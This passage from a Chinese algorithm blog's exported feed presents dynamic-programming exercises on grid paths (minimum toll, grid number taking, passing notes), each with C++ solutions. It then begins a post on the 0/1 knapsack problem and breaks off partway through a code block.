<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>滚动数组：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">110</span>;<br><span class="hljs-type">int</span> t;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cin&gt;&gt;t;<br>    <span class="hljs-keyword">while</span>(t--)&#123;<br>        <span class="hljs-type">int</span> r, c;<br>        <span class="hljs-type">int</span> w[N][N], f[N];<br>        <span class="hljs-built_in">memset</span>(f,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span> f);<br>        cin&gt;&gt;r&gt;&gt;c;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=r;i++)<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=c;j++)<br>                cin&gt;&gt;w[i][j];<br>        <br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=r;i++)<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=c;j++)<br>            &#123;<br>                f[j]=<span class="hljs-built_in">max</span>(f[j],f[j<span class="hljs-number">-1</span>])+w[i][j];<br>            &#125;<br>        cout&lt;&lt;f[c]&lt;&lt;endl;<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1018-最低通行费（数字三角形模型）"><a href="#1018-最低通行费（数字三角形模型）" class="headerlink" title="1018.最低通行费（数字三角形模型）"></a>1018.最低通行费（数字三角形模型）</h3><p>一个商人穿过一个N×N的正方形的网格，去参加一个非常重要的商务活动。</p><p>他要从网格的左上角进，右下角出。</p><p>每穿越中间1个小方格，都要花费1个单位时间。</p><p>商人必须在(2N-1)个单位时间穿越出去。</p><p>而在经过中间的每个小方格时，都需要缴纳一定的费用。</p><p>这个商人期望在规定时间内用最少费用穿越出去。</p><p>请问至少需要多少费用？</p><p>注意：不能对角穿越各个小方格（即，只能向上下左右四个方向移动且不能离开网格）。</p><h4 id="输入格式-6"><a href="#输入格式-6" class="headerlink" title="输入格式"></a>输入格式</h4><p>第一行是一个整数，表示正方形的宽度N。</p><p>后面N行，每行N个不大于100的整数，为网格上每个小方格的费用。</p><h4 id="输出格式-6"><a href="#输出格式-6" class="headerlink" title="输出格式"></a>输出格式</h4><p>输出一个整数，表示至少需要的费用。</p><h4 id="数据范围-6"><a href="#数据范围-6" class="headerlink" title="数据范围"></a>数据范围</h4><p>1≤N≤100</p><h4 id="输入样例：-9"><a href="#输入样例：-9" class="headerlink" title="输入样例："></a>输入样例：</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">5</span><br><span class="hljs-symbol">1 </span> <span class="hljs-number">4</span>  <span class="hljs-number">6</span>  <span class="hljs-number">8</span>  <span class="hljs-number">10</span> <br><span class="hljs-symbol">2 </span> <span class="hljs-number">5</span>  <span class="hljs-number">7</span>  <span class="hljs-number">15</span> <span class="hljs-number">17</span> <br><span class="hljs-symbol">6 </span> <span class="hljs-number">8</span>  <span class="hljs-number">9</span>  <span class="hljs-number">18</span> <span class="hljs-number">20</span> <br><span class="hljs-symbol">10 </span><span class="hljs-number">11</span> <span class="hljs-number">12</span> <span class="hljs-number">19</span> <span class="hljs-number">21</span> <br><span class="hljs-symbol">20 </span><span class="hljs-number">23</span> <span class="hljs-number">25</span> <span class="hljs-number">29</span> <span class="hljs-number">33</span><br></code></pre></td></tr></table></figure><h4 id="输出样例：-9"><a href="#输出样例：-9" class="headerlink" title="输出样例："></a>输出样例：</h4><p>109</p><h4 id="样例解释"><a href="#样例解释" class="headerlink" title="样例解释"></a>样例解释</h4><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit">样例中，最小值为109=1<span class="hljs-string">+2</span><span class="hljs-string">+5</span><span class="hljs-string">+7</span><span class="hljs-string">+9</span><span class="hljs-string">+12</span><span class="hljs-string">+19</span><span class="hljs-string">+21</span><span class="hljs-string">+33</span><br></code></pre></td></tr></table></figure><h4 id="思路：-6"><a href="#思路：-6" class="headerlink" title="思路："></a>思路：</h4><p>这里的出度是确定的上下左右四个方向，可以根据此来推导下一个状态，但是这里要求商人必须在 (2N−1) 个单位时间穿越出去说明没有回头路，只有可能是右下两个方向，故写出度，入度都是2。</p><h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码:"></a>代码:</h4><p>入度：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">110</span>;<br><br><span class="hljs-type">int</span> f[N][N],w[N][N];<br><span class="hljs-type">int</span> n;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>cin&gt;&gt;n;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>cin&gt;&gt;w[i][j];<br><br><span class="hljs-built_in">memset</span>(f,<span class="hljs-number">0x3f</span>,<span class="hljs-keyword">sizeof</span> f);<br>f[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]=w[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>&#123;<br><span class="hljs-comment">//if(i+1&lt;=n) f[i+1][j]=min(f[i+1][j],f[i][j]+w[i+1][j]);</span><br><span class="hljs-comment">//if(i-1&gt;=1) f[i-1][j]=min(f[i-1][j],f[i][j]+w[i-1][j]);</span><br><span class="hljs-comment">//if(j-1&gt;=1)f[i][j-1]=min(f[i][j-1],f[i][j]+w[i][j-1]);</span><br><span class="hljs-comment">//if(j+1&lt;=n)f[i][j+1]=min(f[i][j+1],f[i][j]+w[i][j+1]);</span><br><br><span class="hljs-keyword">if</span>(i&gt;<span class="hljs-number">1</span>) f[i][j]=<span class="hljs-built_in">min</span>(f[i][j],f[i<span class="hljs-number">-1</span>][j]+w[i][j]);<br><span class="hljs-keyword">if</span>(j&gt;<span class="hljs-number">1</span>) f[i][j]=<span class="hljs-built_in">min</span>(f[i][j],f[i][j<span class="hljs-number">-1</span>]+w[i][j]);<br>&#125;<br>cout&lt;&lt;f[n][n]&lt;&lt;endl;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>出度：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">110</span>;<br><br><span class="hljs-type">int</span> f[N][N],w[N][N];<br><span class="hljs-type">int</span> n;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>cin&gt;&gt;n;<br><span class="hljs-built_in">memset</span>(f,<span class="hljs-number">0x3f</span>,<span class="hljs-keyword">sizeof</span> f);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>cin&gt;&gt;w[i][j];<br><br><br>f[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>]=w[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>&#123;<br><span class="hljs-keyword">if</span>(i+<span class="hljs-number">1</span>&lt;=n)f[i+<span class="hljs-number">1</span>][j]=<span class="hljs-built_in">min</span>(f[i+<span class="hljs-number">1</span>][j],f[i][j]+w[i+<span class="hljs-number">1</span>][j]);<br><span class="hljs-keyword">if</span>(j+<span class="hljs-number">1</span>&lt;=n)f[i][j+<span class="hljs-number">1</span>]=<span class="hljs-built_in">min</span>(f[i][j+<span class="hljs-number">1</span>],f[i][j]+w[i][j+<span class="hljs-number">1</span>]);<br><span class="hljs-comment">//cout&lt;&lt;&quot;i+1:j&quot;&lt;&lt;i+1&lt;&lt;&quot;:&quot;&lt;&lt;j&lt;&lt;&quot; &quot;&lt;&lt;f[i+1][j]&lt;&lt;endl;</span><br><span class="hljs-comment">//cout&lt;&lt;&quot;i:j+1&quot;&lt;&lt;i&lt;&lt;&quot;:&quot;&lt;&lt;j+1&lt;&lt;&quot; &quot;&lt;&lt;f[i][j+1]&lt;&lt;endl;</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">if(i&gt;1) f[i][j]=min(f[i][j],f[i-1][j]+w[i][j]);</span><br><span class="hljs-comment">if(j&gt;1) f[i][j]=min(f[i][j],f[i][j-1]+w[i][j]);</span><br><span class="hljs-comment">*/</span><br>&#125;<br>cout&lt;&lt;f[n][n]&lt;&lt;endl;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="1027-方格取数（数字三角形模型）"><a href="#1027-方格取数（数字三角形模型）" class="headerlink" title="1027.方格取数（数字三角形模型）"></a>1027.方格取数（数字三角形模型）</h3><p>设有 N×N 的方格图，我们在其中的某些方格中填入正整数，而其它的方格中则放入数字0。如下图所示：</p><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202303212332130.gif" alt="b637940b2bc3ee3b88f9293d02a8a541"></p><p>某人从图中的左上角 A 出发，可以向下行走，也可以向右行走，直到到达右下角的 B 点。</p><p>在走过的路上，他可以取走方格中的数（取走后的方格中将变为数字0）。</p><p>此人从 A 点到 B 点共走了两次，试找出两条这样的路径，使得取得的数字和为最大。</p><h4 id="输入格式-7"><a href="#输入格式-7" class="headerlink" title="输入格式"></a>输入格式</h4><p>第一行为一个整数N，表示 N×N 的方格图。</p><p>接下来的每行有三个整数，第一个为行号数，第二个为列号数，第三个为在该行、该列上所放的数。</p><p>行和列编号从 1 开始。</p><p>一行“0 0 0”表示结束。</p><h4 id="输出格式-7"><a href="#输出格式-7" class="headerlink" title="输出格式"></a>输出格式</h4><p>输出一个整数，表示两条路径上取得的最大的和。</p><h4 id="数据范围-7"><a href="#数据范围-7" class="headerlink" title="数据范围"></a>数据范围</h4><p>N≤10</p><h4 id="输入样例：-10"><a href="#输入样例：-10" class="headerlink" title="输入样例："></a>输入样例：</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">8</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">3</span> <span class="hljs-number">13</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">6</span> <span class="hljs-number">6</span><br><span class="hljs-symbol">3 </span><span class="hljs-number">5</span> <span class="hljs-number">7</span><br><span class="hljs-symbol">4 </span><span class="hljs-number">4</span> <span class="hljs-number">14</span><br><span class="hljs-symbol">5 </span><span class="hljs-number">2</span> <span class="hljs-number">21</span><br><span class="hljs-symbol">5 </span><span class="hljs-number">6</span> <span class="hljs-number">4</span><br><span class="hljs-symbol">6 </span><span class="hljs-number">3</span> <span class="hljs-number">15</span><br><span class="hljs-symbol">7 </span><span class="hljs-number">2</span> <span class="hljs-number">14</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">0</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h4 id="输出样例：-10"><a href="#输出样例：-10" class="headerlink" title="输出样例："></a>输出样例：</h4><p>67</p><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路:"></a>思路:</h4><p><img src="https://testingcf.jsdelivr.net/gh/c1ongyan/picture@main/img/202303220051231.png" alt="81a9da6cb902efe5a9ae67a78a858504"></p><h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码:"></a>代码:</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">51</span>;<br><br><span class="hljs-type">int</span> w[N][N];<br><span class="hljs-type">int</span> f[N*<span class="hljs-number">2</span>][N][N];<br><span class="hljs-comment">//这里的N*2也可以写成N&lt;&lt;1</span><br><span class="hljs-type">int</span> n;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cin&gt;&gt;n;<br>    <span class="hljs-type">int</span> a,r,c;<br>    <span class="hljs-keyword">while</span>(cin&gt;&gt;r&gt;&gt;c&gt;&gt;a,r&amp;&amp;c&amp;&amp;a)&#123;<br>       w[r][c]=a;<br>    &#125;<br>    <span class="hljs-comment">//f[1][1][1]=0</span><br>    <span class="hljs-comment">//总步数是2n-1步 这里不能从k=1开始的原因是k的最大值应该为n+n，对应右下角的点</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">2</span>;k&lt;=n+n;k++)<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i1=<span class="hljs-number">1</span>;i1&lt;=n;i1++)<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i2=<span class="hljs-number">1</span>;i2&lt;=n;i2++)<br>            &#123;<br>                <span class="hljs-type">int</span> j1=k-i1,j2=k-i2;<br>                <span class="hljs-comment">//根据入度设计</span><br>                <span class="hljs-keyword">if</span>(j1&lt;=n&amp;&amp;j2&lt;=n)<br>                &#123;<br>                    <span class="hljs-comment">//重合</span><br>                    <span class="hljs-type">int</span> t=w[i1][j1];<br>                    <span class="hljs-comment">//不重合</span><br>                    <span class="hljs-keyword">if</span>(i1!=i2) t+=w[i2][j2];<br>                    <span class="hljs-type">int</span> &amp;x=f[k][i1][i2];<br>                    <span class="hljs-comment">//上一步 下 下</span><br>                    x=<span class="hljs-built_in">max</span>(x,f[k<span class="hljs-number">-1</span>][i1<span class="hljs-number">-1</span>][i2<span class="hljs-number">-1</span>]+t);<br>                    <span class="hljs-comment">//下 右</span><br>                    x=<span class="hljs-built_in">max</span>(x,f[k<span class="hljs-number">-1</span>][i1<span class="hljs-number">-1</span>][i2]+t);<br>                    <span class="hljs-comment">//右 下</span><br>                    x=<span class="hljs-built_in">max</span>(x,f[k<span class="hljs-number">-1</span>][i1][i2<span class="hljs-number">-1</span>]+t);<br>                    <span class="hljs-comment">//右 右</span><br>                    x=<span class="hljs-built_in">max</span>(x,f[k<span class="hljs-number">-1</span>][i1][i2]+t);<br>                &#125;<br>                <br>            &#125;<br>    cout&lt;&lt;f[n+n][n][n]&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="275-传纸条-数字三角形模型"><a href="#275-传纸条-数字三角形模型" class="headerlink" title="275.传纸条(数字三角形模型)"></a>275.传纸条(数字三角形模型)</h3><p>小渊和小轩是好朋友也是同班同学，他们在一起总有谈不完的话题。</p><p>一次素质拓展活动中，班上同学安排坐成一个 m 行 n 列的矩阵，而小渊和小轩被安排在矩阵对角线的两端，因此，他们就无法直接交谈了。</p><p>幸运的是，他们可以通过传纸条来进行交流。</p><p>纸条要经由许多同学传到对方手里，小渊坐在矩阵的左上角，坐标 (1,1)，小轩坐在矩阵的右下角，坐标 (m,n)。</p><p>从小渊传到小轩的纸条只可以向下或者向右传递，从小轩传给小渊的纸条只可以向上或者向左传递。 </p><p>在活动进行中，小渊希望给小轩传递一张纸条，同时希望小轩给他回复。</p><p>班里每个同学都可以帮他们传递，但只会帮他们一次，也就是说如果此人在小渊递给小轩纸条的时候帮忙，那么在小轩递给小渊的时候就不会再帮忙，反之亦然。 </p><p>还有一件事情需要注意，全班每个同学愿意帮忙的好感度有高有低（注意：小渊和小轩的好心程度没有定义，输入时用 0 表示），可以用一个 0∼100 的自然数来表示，数越大表示越好心。</p><p>小渊和小轩希望尽可能找好心程度高的同学来帮忙传纸条，即找到来回两条传递路径，使得这两条路径上同学的好心程度之和最大。</p><p>现在，请你帮助小渊和小轩找到这样的两条路径。</p><h4 id="输入格式-8"><a href="#输入格式-8" class="headerlink" title="输入格式"></a>输入格式</h4><p>第一行有 2 个用空格隔开的整数 m 和 n，表示学生矩阵有 m 行 n 列。</p><p>接下来的 m 行是一个 m×n 的矩阵，矩阵中第 i 行 j 列的整数表示坐在第 i 行 j 列的学生的好心程度，每行的 n 个整数之间用空格隔开。</p><h4 id="输出格式-8"><a href="#输出格式-8" class="headerlink" title="输出格式"></a>输出格式</h4><p>输出一个整数，表示来回两条路上参与传递纸条的学生的好心程度之和的最大值。</p><h4 id="数据范围-8"><a href="#数据范围-8" class="headerlink" title="数据范围"></a>数据范围</h4><p>1≤n,m≤50</p><h4 id="输入样例：-11"><a href="#输入样例：-11" class="headerlink" title="输入样例："></a>输入样例：</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">3 </span><span class="hljs-number">3</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">3</span> <span class="hljs-number">9</span><br><span class="hljs-symbol">2 </span><span class="hljs-number">8</span> <span class="hljs-number">5</span><br><span class="hljs-symbol">5 </span><span class="hljs-number">7</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h4 id="输出样例：-11"><a href="#输出样例：-11" class="headerlink" title="输出样例："></a>输出样例：</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">34<br></code></pre></td></tr></table></figure><h4 id="思路：-7"><a href="#思路：-7" class="headerlink" title="思路："></a>思路：</h4><p>参考博客：<a href="https://www.acwing.com/solution/content/12389/">https://www.acwing.com/solution/content/12389/</a></p><p>类似方格取数，虽然这题不能曲同一个点，但是方格取数在用过的点设置为0的情况下，绕过该点的方法不会使结果变坏，要么不变要么变好，故仍然可以套用方格取数</p><h4 id="代码：-5"><a href="#代码：-5" class="headerlink" title="代码："></a>代码：</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">55</span>;<br><br><span class="hljs-type">int</span> w[N][N];<br><span class="hljs-type">int</span> f[N*<span class="hljs-number">2</span>][N][N];<br><span class="hljs-comment">//这里的N*2也可以写成N&lt;&lt;1</span><br><span class="hljs-type">int</span> m,n;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    cin&gt;&gt;m&gt;&gt;n;<br>    <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++)<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>            cin&gt;&gt;w[i][j];<br>    <span class="hljs-comment">//f[1][1][1]=0</span><br>    <span class="hljs-comment">//总步数是n+m-1步 这里不能从k=1开始的原因是k的最大值应该为n+m，对应右下角的点</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">2</span>;k&lt;=n+m;k++)<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i1=<span class="hljs-number">1</span>;i1&lt;=m;i1++)<span class="hljs-comment">//i1&lt;k也一样</span><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i2=<span class="hljs-number">1</span>;i2&lt;=m;i2++)<span class="hljs-comment">//i2&lt;k也一样</span><br>            &#123;<br>                <span class="hljs-type">int</span> j1=k-i1,j2=k-i2;<br>                <span class="hljs-comment">//根据入度设计</span><br>                <span class="hljs-keyword">if</span>(j1&lt;=n&amp;&amp;j2&lt;=n&amp;&amp;j1&gt;=<span class="hljs-number">1</span>&amp;&amp;j2&gt;=<span class="hljs-number">1</span>)<br>                &#123;<br>                    <span class="hljs-comment">//重合</span><br>                    <span class="hljs-type">int</span> t=w[i1][j1];<br>                    <span class="hljs-comment">//不重合</span><br>                    <span class="hljs-keyword">if</span>(i1!=i2) t+=w[i2][j2];<br>                    <span class="hljs-type">int</span> &amp;x=f[k][i1][i2];<br>                    <span class="hljs-comment">//上一步 下 下</span><br>                    x=<span class="hljs-built_in">max</span>(x,f[k<span class="hljs-number">-1</span>][i1<span class="hljs-number">-1</span>][i2<span class="hljs-number">-1</span>]+t);<br>                    <span class="hljs-comment">//下 右</span><br>                    x=<span class="hljs-built_in">max</span>(x,f[k<span class="hljs-number">-1</span>][i1<span class="hljs-number">-1</span>][i2]+t);<br>                    <span class="hljs-comment">//右 下</span><br>                    x=<span class="hljs-built_in">max</span>(x,f[k<span class="hljs-number">-1</span>][i1][i2<span class="hljs-number">-1</span>]+t);<br>                    <span class="hljs-comment">//右 右</span><br>                    x=<span class="hljs-built_in">max</span>(x,f[k<span class="hljs-number">-1</span>][i1][i2]+t);<br>                &#125;<br>                <br>            &#125;<br>    cout&lt;&lt;f[n+m][m][m]&lt;&lt;endl;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>动态规划</title>
    <link href="/post/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92.html"/>
    <url>/post/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92.html</url>
    
    <content type="html"><![CDATA[<h1 id="动态规划-一"><a href="#动态规划-一" class="headerlink" title="动态规划(一)"></a>动态规划(一)</h1><p>状态表示：用几维来表示状态</p><p>状态计算：如何计算状态最优值</p><h2 id="背包问题"><a href="#背包问题" class="headerlink" title="背包问题"></a>背包问题</h2><h3 id="1-01背包问题"><a href="#1-01背包问题" class="headerlink" title="1.01背包问题"></a>1.01背包问题</h3><p>每个物品一个</p><p>给定 n 种物品和一个容量为 C 的背包，物品 i 的重量是 wi，其价值为 vi 。</p><p>问：应该如何选择装入背包的物品，使得装入背包中的物品的总价值最大？</p><p>题目：</p><p>有 N 件物品和一个容量是 V 的背包。每件物品只能使用一次。</p><p>第 i 件物品的体积是 vi，价值是 wi。</p><p>求解将哪些物品装入背包，可使这些物品的总体积不超过背包容量，且总价值最大。<br>输出最大价值。</p><p>输入格式</p><p>第一行两个整数，N，V，用空格隔开，分别表示物品数量和背包容积。</p><p>接下来有 N 行，每行两个整数 vi,wi，用空格隔开，分别表示第 i 件物品的体积和价值。</p><p>输出格式</p><p>输出一个整数，表示最大价值。</p><p>数据范围</p><p>0  &lt;  N,  V  ≤  10000  &lt;  N,  V  ≤  1000<br>0  &lt;  vi, wi  ≤  10000  &lt;  vi,  wi  ≤  1000</p><p>输入样例</p><p>4 5<br>1 2<br>2 4<br>3 4<br>4 5<br>输出样例：</p><p>8</p><p>二维写法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 